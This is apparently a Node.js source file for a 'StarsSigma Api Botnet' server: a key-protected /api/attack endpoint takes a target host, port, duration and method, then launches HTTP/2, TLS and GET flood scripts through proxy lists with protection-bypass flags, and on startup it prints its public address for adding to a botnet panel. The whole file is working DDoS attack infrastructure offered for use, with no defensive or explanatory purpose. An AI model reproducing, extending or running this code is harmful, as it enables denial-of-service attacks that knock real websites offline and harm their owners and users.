const port = process.env.PORT || process.env.SERVER_PORT || 2090;
const key = "hanzz";

const os = require('os');
const { execSync } = require('child_process');
const axios = require('axios');
const express = require('express');
const app = express();

app.get('/api/attack', (req, res) => {
  try {
    const reqKey = req.query.key;
    const host = req.query.host;
    const targetPort = req.query.port;
    const time = parseInt(req.query.time);
    const method = req.query.method;

    if (reqKey !== key) {
      return res.status(401).send('Key not working');
    }

    if (!host || !targetPort || !time || !method) {
      return res.status(400).send('Missing parameters!');
    }

    if (method === 'FLOOD-X') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['strike.js', 'GET', host, time, 4, 52, 'proxy.txt', '--legit', '--uam']);
      
      
      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>StarsSigma Api Botnet</h1>
                <p>🦄Host : ${host}</p>
                <p>🦄Port : ${port}</p>
                <p>🦄Time : ${time}</p>
                <p>🦄Method : ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Prosess Selesai!!!, Menghentikan Aktivitas ');
          res.status(500).send('Prosess Selesai!!!, Menghentikan Aktivitas ');
        }
      });
      } else if (method === 'HARDER') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['strike.js', 'GET', host, time, 6, 512, 'proxy.txt', '--legit', '--full']);
      
      
      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>StarsSigma Api Botnet</h1>
                <p>🦄Host : ${host}</p>
                <p>🦄Port : ${port}</p>
                <p>🦄Time : ${time}</p>
                <p>🦄Method : ${method}</p>
              </body>
            </html>
          `;
        } else {
          console.error('Prosess Selesai!!!, Menghentikan Aktivitas ');
          res.status(500).send('Prosess Selesai!!!, Menghentikan Aktivitas ');
        }
      });
      } else if (method === 'FLOOD-S') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['!H2-BYPASS.js', host, time, 52, 4, 'proxy.txt']);
      

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>StarsSigma Api Botnet</h1>
                <p>🦄Host : ${host}</p>
                <p>🦄Port : ${port}</p>
                <p>🦄Time : ${time}</p>
                <p>🦄Method : ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Prosess Selesai!!!, Menghentikan Aktivitas ');
          res.status(500).send('Prosess Selesai!!!, Menghentikan Aktivitas ');
        }
      });
      } else if (method === 'FLOOD-H') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['!H2-FLASH.js', host, time, 512, 5, 'proxy.txt']);
      

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>StarsSigma Api Botnet</h1>
                <p>🦄Host : ${host}</p>
                <p>🦄Port : ${port}</p>
                <p>🦄Time : ${time}</p>
                <p>🦄Method : ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Prosess Selesai!!!, Menghentikan Aktivitas ');
          res.status(500).send('Prosess Selesai!!!, Menghentikan Aktivitas ');
        }
      });
      } else if (method === 'TLS-X') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['tlsx.js', host, time, 65, 4, 'proxy.txt', '--randrate', '--full', '--legit']);
      
      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>StarsSigma Api Botnet</h1>
                <p>🦄Host : ${host}</p>
                <p>🦄Port : ${port}</p>
                <p>🦄Time : ${time}</p>
                <p>🦄Method : ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Prosess Selesai!!!, Menghentikan Aktivitas ');
          res.status(500).send('Prosess Selesai!!!, Menghentikan Aktivitas ');
        }
      });
    }
     
     //if error 🦄
      else {
      console.error('Metode yang salah..');
      res.status(400).send('Metode yang salah..');
    }
  } catch (error) {
    console.error(error);
    res.status(500).send('Ada masalah.');
  }
});



//func to start all prosess 🦄
app.listen(port, () => {
  console.clear();  
  
  const ipVPS = execSync("curl -s ifconfig.me").toString().trim();  
  console.log(`Copy This And Add To Your Endpoint: http://${ipVPS}:${port}`);
});
